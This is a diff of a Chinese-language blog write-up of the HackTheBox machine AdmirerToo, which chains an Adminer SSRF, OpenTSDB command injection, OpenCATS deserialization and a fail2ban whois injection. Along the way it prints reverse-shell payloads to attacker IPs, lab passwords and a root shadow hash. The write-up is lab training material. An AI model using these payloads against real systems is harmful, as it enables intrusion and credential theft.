@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;427 10.10.11.137                                                                                                              端口扫描需要全端口扫描,本地扫非常慢，建">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;427 10.10.11.137   端口扫描需要全端口扫描,本地扫非常慢，建议开pwnbox,并且注意扫描选项： 12345678910111213141516171819202122232425262728293031323334sudo nmap -p- -sF -v 10.10.11">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AdmirerToo - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/01/28/AdmirerToo-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;427 10.10.11.137                                                                                                              端口扫描需要全端口扫描,本地扫非常慢，建">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;427 10.10.11.137   端口扫描需要全端口扫描,本地扫非常慢，建议开pwnbox,并且注意扫描选项： 12345678910111213141516171819202122232425262728293031323334sudo nmap -p- -sF -v 10.10.11">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012701.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012702.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012703.jpg">
@@ -136,8 +136,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -159,7 +166,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -226,57 +233,22 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/427" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/427</a></li>
 <li>10.10.11.137</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012701.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口扫描,本地扫非常慢，建议开pwnbox,并且注意扫描选项：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sF -v 10.10.11.137</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.137</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65530 closed tcp ports (reset)</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">22/tcp    open|filtered ssh</span><br><span class="line">80/tcp    open|filtered http</span><br><span class="line">4242/tcp  filtered      vrml-multi-use</span><br><span class="line">16010/tcp open|filtered unknown</span><br><span class="line">16030/tcp open|filtered unknown</span><br><span class="line"></span><br><span class="line">sudo nmap -sC -sV -sF -p22,80,4242,16010,16030 10.10.11.137</span><br><span class="line">└──╼ [★]$ sudo nmap -sC -sV -sF -p22,80,4242,16010,16030 10.10.11.137</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 08:21 GMT</span><br><span class="line">Nmap scan report for 10.10.11.137</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE        VERSION</span><br><span class="line">22/tcp    open          ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp    open          http           Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">4242/tcp  filtered      vrml-multi-use</span><br><span class="line">16010/tcp open|filtered tcpwrapped</span><br><span class="line">16030/tcp open|filtered tcpwrapped</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012702.jpg" alt=""></p>
 <h1 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h1><p>任意不存在的路径，404页面邮箱地址得到域名：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012703.jpg" alt=""></p>
 <p>加入hosts后，扫描子域名,发现一个db：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.137 admirer-gallery.htb</span><br><span class="line"></span><br><span class="line">gobuster vhost -u http://admirer-gallery.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -r</span><br><span class="line"></span><br><span class="line">Found: db.admirer-gallery.htb (Status: 200) [Size: 2569]</span><br></pre></td></tr></table></figure>
 
 <h2 id="db-admirer-gallery-htb"><a href="#db-admirer-gallery-htb" class="headerlink" title="db.admirer-gallery.htb"></a>db.admirer-gallery.htb</h2><p>加入hosts后访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012704.jpg" alt=""></p>
 <h1 id="Adminer"><a href="#Adminer" class="headerlink" title="Adminer"></a>Adminer</h1><p>预设置账号密码，进去里面没什么有用信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012705.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012705.jpg" alt=""></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"auth[driver]"</span> <span class="attr">value</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line">								<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"auth[server]"</span> <span class="attr">value</span>=<span class="string">"localhost"</span>&gt;</span></span><br><span class="line">								<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"auth[username]"</span> <span class="attr">value</span>=<span class="string">"admirer_ro"</span>&gt;</span></span><br><span class="line">								<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"auth[password]"</span> <span class="attr">value</span>=<span class="string">"1w4nn4b3adm1r3d2!"</span>&gt;</span></span><br><span class="line">								<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">"auth[db]"</span> <span class="attr">value</span>=<span class="string">"admirer"</span>/&gt;</span></span><br><span class="line">								<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span></span></span><br></pre></td></tr></table></figure>
 
 <h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>可以搜到Adminer的SSRF</p>
@@ -285,75 +257,26 @@
 <p>直接burp修改连接信息，会发现显示为4.8.1:</p>
 </li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012706.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012706.jpg" alt=""></p>
 <h2 id="SSRF-to-opentsdb"><a href="#SSRF-to-opentsdb" class="headerlink" title="SSRF to opentsdb"></a>SSRF to opentsdb</h2><p>Adminer可以使用其他driver，例如elestic，修改driver，使用脚本重定向，可以访问到4242端口的opentsdb：</p>
 <ul>
 <li><a href="https://github.com/vrana/adminer/tree/master/adminer/drivers" target="_blank" rel="noopener">https://github.com/vrana/adminer/tree/master/adminer/drivers</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012707.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012708.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012709.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012707.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012708.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012709.jpg" alt=""></p>
 <h2 id="OpenTSDB-getshell"><a href="#OpenTSDB-getshell" class="headerlink" title="OpenTSDB getshell"></a>OpenTSDB getshell</h2><p>opentsdb存在已知漏洞，后面就是一步步打：</p>
 <ul>
 <li>OpenTSDB 2.4.0 Remote Code Execution · Issue #2051 · OpenTSDB/opentsdb<br><a href="https://github.com/OpenTSDB/opentsdb/issues/2051" target="_blank" rel="noopener">https://github.com/OpenTSDB/opentsdb/issues/2051</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python redirect.py -i 10.10.14.10 --port 7777 http://127.0.0.1:4242/api/version</span><br><span class="line"></span><br><span class="line">"version":"2.4.0"</span><br><span class="line"></span><br><span class="line">python redirect.py -i 10.10.14.10 --port 7777 http://127.0.0.1:4242/api/suggest?type=metrics</span><br><span class="line"></span><br><span class="line">["http.stats.web.hits"]</span><br><span class="line"></span><br><span class="line">bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.10/4444 &lt;&amp;1'</span><br><span class="line"><span class="meta">%</span><span class="bash">22bash%20-c%20<span class="string">'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.10/4444%20%3C%261'</span>%22</span></span><br><span class="line"></span><br><span class="line">python redirect.py -i 10.10.14.10 --port 7777 "http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%22bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.10/4444%20%3C%261'%22)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json"</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012710.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012711.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012710.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012711.jpg" alt=""></p>
 <h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>搜索可能存在密码配置的文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -iRl 'pass' /var/www/adminer/ 2&gt;/dev/null</span><br><span class="line">/var/www/adminer/plugins/data/servers.php</span><br><span class="line">/var/www/adminer/plugins/oneclick-login.php</span><br><span class="line">/var/www/adminer/plugins/plugin.php</span><br><span class="line">/var/www/adminer/adminer-included-0ae90598f37b20e3e7eb122c427729ed.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012713.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012713.jpg" alt=""></p>
 <p>/var/www/adminer/plugins/data/server.php中获得很复杂的密码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">  <span class="string">'localhost'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//    'username' =&gt; 'admirer',</span></span><br><span class="line"><span class="comment">//    'pass'     =&gt; 'bQ3u7^AxzcB7qAsxE3',</span></span><br><span class="line"><span class="comment">// Read-only account for testing</span></span><br><span class="line">    <span class="string">'username'</span> =&gt; <span class="string">'admirer_ro'</span>,</span><br><span class="line">    <span class="string">'pass'</span>     =&gt; <span class="string">'1w4nn4b3adm1r3d2!'</span>,</span><br><span class="line">    <span class="string">'label'</span>    =&gt; <span class="string">'MySQL'</span>,</span><br><span class="line">    <span class="string">'databases'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">'admirer'</span> =&gt; <span class="string">'Admirer DB'</span>,</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
 
@@ -362,25 +285,11 @@
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的密码就是jennifer用户ssh密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer</span><br><span class="line">bQ3u7^AxzcB7qAsxE3</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012712.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012712.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="opencats"><a href="#opencats" class="headerlink" title="opencats"></a>opencats</h2><p>本地8080端口另一个web，转发出来：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8888:localhost:8080 jennifer@10.10.11.137</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012714.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012714.jpg" alt=""></p>
 <p>这个版本存在已知漏洞：</p>
 <ul>
 <li>OpenCATS PHP Object Injection to Arbitrary File Write<br><a href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html" target="_blank" rel="noopener">https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</a></li>
@@ -394,113 +303,29 @@
 <h1 id="opencats-1"><a href="#opencats-1" class="headerlink" title="opencats"></a>opencats</h1><h2 id="database"><a href="#database" class="headerlink" title="database"></a>database</h2><p>/opt/opencats/config.php里可以得到数据库账号密码，admin hash破解不出来，但可以直接修改：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/* Database configuration. */</span><br><span class="line">define('DATABASE_USER', 'cats');</span><br><span class="line">define('DATABASE_PASS', 'adm1r3r0fc4ts');</span><br><span class="line">define('DATABASE_HOST', 'localhost');</span><br><span class="line">define('DATABASE_NAME', 'cats_dev');</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; select user_name,password,user_id from user\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">user_name: admin</span><br><span class="line"> password: dfa2a420a4e48de6fe481c90e295fe97</span><br><span class="line">  user_id: 1</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">user_name: cats@rootadmin</span><br><span class="line"> password: cantlogin</span><br><span class="line">  user_id: 1250</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">user_name: jennifer</span><br><span class="line"> password: f59f297aa82171cc860d76c390ce7f3e</span><br><span class="line">  user_id: 1251</span><br><span class="line">3 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">password123</span><br><span class="line">MariaDB [cats_dev]&gt; update user set password = '482c811da5d5b4bc6d497ffa98491e38' where user_id = 1;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012715.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012715.jpg" alt=""></p>
 <h2 id="反序列化任意写文件"><a href="#反序列化任意写文件" class="headerlink" title="反序列化任意写文件"></a>反序列化任意写文件</h2><p>测试反序列化，发现可以以devel权限写文件，devel不能登录，但有权限写/usr/local/etc配置文件目录</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt ./test.txt</span><br><span class="line"></span><br><span class="line">jennifer@admirertoo:~$ ls -al /dev/shm/test.txt</span><br><span class="line">-rw-r--r-- 1 devel devel 56 Jan 28 07:06 /dev/shm/test.txt</span><br><span class="line">jennifer@admirertoo:~$ grep 'devel' /etc/passwd</span><br><span class="line">devel:x:1003:1003::/home/devel:/sbin/nologin</span><br><span class="line">jennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null</span><br><span class="line">/dev/shm/test.txt</span><br><span class="line">/opt/opencats/INSTALL_BLOCK</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/etc</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012717.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012718.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012719.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012717.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012718.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012719.jpg" alt=""></p>
 <h1 id="Fail2Ban"><a href="#Fail2Ban" class="headerlink" title="Fail2Ban"></a>Fail2Ban</h1><p>查看配置，可以知道默认对ssh配置了fail2ban，当有ip被ban时会触发邮件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012716.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012716.jpg" alt=""></p>
 <p>根据github中漏洞描述，我们可以通过控制whois响应获得命令执行，虽然我们不能修改/etc/hosts,但可以通过opencats的反序列化写whois配置文件,但会被写入一些其他数据：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012720.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012720.jpg" alt=""></p>
 <p>根据文档闭合，从而控制whois服务器：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;]|. [10.10.14.12]</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012721.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012721.jpg" alt=""></p>
 <h1 id="Exploit-amp-root-flag"><a href="#Exploit-amp-root-flag" class="headerlink" title="Exploit &amp; root flag"></a>Exploit &amp; root flag</h1><p>整个流程就是反序列化写whois配置文件控制whois server，控制whois响应为reverse shell，ssh触发fail2ban从而触发代码执行，获得shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf  ./test.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> rshell file</span></span><br><span class="line">~| bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1" &amp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> whois server</span></span><br><span class="line">ncat -nvlkp 43 -c "cat ./rshell"</span><br><span class="line"></span><br><span class="line">jennifer@admirertoo:~$ whois 10.10.14.12</span><br><span class="line">~| bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1" &amp;</span><br><span class="line"></span><br><span class="line">ssh root@10.10.11.137</span><br><span class="line"></span><br><span class="line">cat /etc/shadow</span><br><span class="line">root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012722.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012723.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012724.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012725.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012726.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012722.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012723.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012724.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012725.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012726.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>SSRF in adminer · CVE-2021-21311 · GitHub Advisory Database<br><a href="https://github.com/advisories/GHSA-x5r2-hj5c-8jx6" target="_blank" rel="noopener">https://github.com/advisories/GHSA-x5r2-hj5c-8jx6</a></li>
 <li><a href="https://github.com/vrana/adminer/tree/master/adminer/drivers" target="_blank" rel="noopener">https://github.com/vrana/adminer/tree/master/adminer/drivers</a></li>
